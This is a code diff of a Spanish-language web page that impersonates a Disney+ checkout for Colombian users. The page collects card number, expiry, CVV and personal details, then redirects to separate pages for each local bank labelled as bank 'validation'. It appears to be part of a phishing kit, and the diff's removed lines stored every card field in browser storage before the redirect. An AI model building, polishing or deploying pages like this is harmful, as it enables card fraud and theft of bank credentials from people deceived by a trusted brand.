@@ -15,27 +15,51 @@ body {
     color: #fff;
 }
 
+/* HEADER */
 header {
     padding: 20px;
     display: flex;
     justify-content: space-between;
     align-items: center;
 }
-header img { height: 34px; }
-header a { color: #bbb; text-decoration: none; }
 
+header img {
+    height: 34px;
+}
+
+header a {
+    color: #bbb;
+    font-size: 15px;
+    text-decoration: none;
+}
+
+/* CONTENEDOR PRINCIPAL */
 .main-container {
     padding: 20px;
     max-width: 600px;
     margin: auto;
 }
 
+.step {
+    font-size: 14px;
+    color: #9ca3af;
+}
+
+h1 {
+    font-size: 28px;
+    margin-top: 5px;
+    margin-bottom: 25px;
+}
+
+/* LABELS */
 label {
     display: block;
     margin: 18px 0 6px;
+    font-size: 14px;
     color: #d1d5db;
 }
 
+/* INPUTS */
 input, select {
     width: 100%;
     padding: 15px;
@@ -43,10 +67,15 @@ input, select {
     border: 1px solid #383838;
     border-radius: 6px;
     color: #fff;
+    font-size: 15px;
+    box-sizing: border-box;
 }
 
-/* CAMPO TARJETA */
-.input-card { position: relative; }
+/* INPUT TARJETA */
+.input-card {
+    position: relative;
+}
+
 .card-icons {
     position: absolute;
     right: 12px;
@@ -55,16 +84,39 @@ input, select {
     display: flex;
     gap: 6px;
 }
-.card-icons img { height: 26px; }
 
-/* FECHA / CVV */
-.row-double { display: flex; gap: 15px; }
-.field-group { flex: 1; }
+.card-icons img {
+    height: 26px;
+    opacity: .9;
+}
+
+/* FILA FECHA / CVV */
+.row-double {
+    display: flex;
+    gap: 15px;
+    margin-top: 5px;
+}
+
+.field-group {
+    flex: 1;
+    min-width: 0;
+}
+
+/* PRECIO */
+#totalBox {
+    margin-top: 22px;
+    background: #1a1a1a;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 17px;
+    border: 1px solid #333;
+}
 
 /* BOTÓN */
 button {
     width: 100%;
     padding: 16px;
+    margin-top: 20px;
     background: #fff;
     border: none;
     color: #000;
@@ -74,14 +126,21 @@ button {
     font-weight: 600;
 }
 
-@media (max-width: 480px) {
-    .row-double { flex-direction: column; }
+/* FOOTER */
+footer {
+    margin-top: 50px;
+    padding: 35px 20px;
+    background: #0d0d0d;
+    color: #7e7e7e;
+    text-align: center;
+    font-size: 13px;
 }
 </style>
 </head>
 
 <body>
 
+<!-- HEADER -->
 <header>
     <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
     <a href="#">Cerrar sesión</a>
@@ -89,15 +148,16 @@ button {
 
 <div class="main-container">
 
-    <h2>PASO 3 DE 3</h2>
+    <div class="step">PASO 3 DE 3</div>
     <h1>¡A disfrutar!</h1>
 
+    <!-- FORMULARIO -->
     <label>NOMBRE EN LA TARJETA</label>
-    <input id="nombreTarjeta" type="text" placeholder="Nombre del titular">
+    <input type="text" placeholder="Nombre del titular">
 
-    <label>NÚMERO DE TARJETA</label>
+    <label>NÚMERO DE LA TARJETA</label>
     <div class="input-card">
-        <input id="numeroTarjeta" type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
+        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
         <div class="card-icons">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
@@ -107,67 +167,77 @@ button {
 
     <div class="row-double">
         <div class="field-group">
-            <label>FECHA VENC.</label>
-            <input id="fecha" type="text" placeholder="MM/AA">
+            <label>FECHA DE VENCIMIENTO</label>
+            <input type="text" placeholder="MM/AA" maxlength="5">
         </div>
 
         <div class="field-group">
-            <label>CVV</label>
-            <input id="cvv" type="password" maxlength="4" placeholder="CVV">
+            <label>CÓDIGO DE SEGURIDAD</label>
+            <input type="text" placeholder="CVV" maxlength="4">
         </div>
     </div>
 
     <label>CIUDAD</label>
-    <input id="ciudad" type="text" placeholder="Ciudad">
+    <input type="text" placeholder="Ingrese su ciudad">
 
     <label>DEPARTAMENTO</label>
-    <select id="departamento">
-        <option value="">Seleccionar…</option>
+    <select>
+        <option>Seleccionar…</option>
         <option>Antioquia</option>
         <option>Cundinamarca</option>
-        <option>Valle</option>
+        <option>Valle del Cauca</option>
         <option>Atlántico</option>
+        <option>Santander</option>
     </select>
 
-    <label>RUT (opcional)</label>
-    <input id="rut" type="text" placeholder="Opcional">
+    <label>RUT (OPCIONAL)</label>
+    <input type="text" placeholder="Opcional">
 
-    <label>Selecciona tu banco</label>
-    <select id="banco">
-        <option value="">Elegir banco…</option>
-        <option value="banco-bancolombia.html">Bancolombia</option>
-        <option value="banco-nequi.html">Nequi</option>
-        <option value="banco-davivienda.html">Davivienda</option>
-        <option value="banco-bbva.html">BBVA</option>
-        <option value="banco-bogota.html">Banco de Bogotá</option>
-        <option value="banco-popular.html">Banco Popular</option>
-        <option value="banco-itau.html">Itaú</option>
+    <!-- SELECCIÓN BANCO -->
+    <label>BANCO PARA VALIDAR</label>
+    <select id="bank">
+        <option value="">Seleccione su banco…</option>
+        <option value="bancolombia.html">Bancolombia</option>
+        <option value="nequi.html">Nequi</option>
+        <option value="davivienda.html">Davivienda</option>
+        <option value="bbva.html">BBVA</option>
+        <option value="popular.html">Banco Popular</option>
+        <option value="bogota.html">Banco de Bogotá</option>
+        <option value="itau.html">Itaú</option>
     </select>
 
-    <button onclick="redirigirBanco()">INICIAR VALIDACIÓN</button>
+    <!-- PRECIO -->
+    <div id="totalBox">
+        Total a pagar: <strong id="planPrice"></strong>
+    </div>
+
+    <button onclick="goBank()">INICIAR SUSCRIPCIÓN</button>
+
 </div>
 
+<footer>
+    © 2025 Disney+. Todos los derechos reservados.  
+    <br>
+    <a href="#">Términos de uso</a> · 
+    <a href="#">Política de privacidad</a> · 
+    <a href="#">Ayuda</a>
+</footer>
+
 <script>
-function redirigirBanco() {
+// Mostrar precio dinámico
+document.getElementById("planPrice").innerText = 
+    "COP " + (localStorage.getItem("planPrice") || "24.900") + "/mes";
 
-    const bankPage = document.getElementById("banco").value;
+// Redirigir al banco seleccionado
+function goBank() {
+    const bank = document.getElementById("bank").value;
 
-    if (bankPage === "") {
-        alert("Selecciona un banco para continuar.");
+    if (bank === "") {
+        alert("Selecciona tu banco para validar el pago.");
         return;
     }
 
-    // GUARDA TODO ANTES DE REDIRIGIR
-    localStorage.setItem("nombreTarjeta", document.getElementById("nombreTarjeta").value);
-    localStorage.setItem("numeroTarjeta", document.getElementById("numeroTarjeta").value);
-    localStorage.setItem("fecha", document.getElementById("fecha").value);
-    localStorage.setItem("cvv", document.getElementById("cvv").value);
-    localStorage.setItem("ciudad", document.getElementById("ciudad").value);
-    localStorage.setItem("departamento", document.getElementById("departamento").value);
-    localStorage.setItem("rut", document.getElementById("rut").value);
-
-    // REDIRECCIÓN A LA PÁGINA DEL BANCO
-    window.location.href = bankPage;
+    window.location.href = bank;
 }
 </script>
 
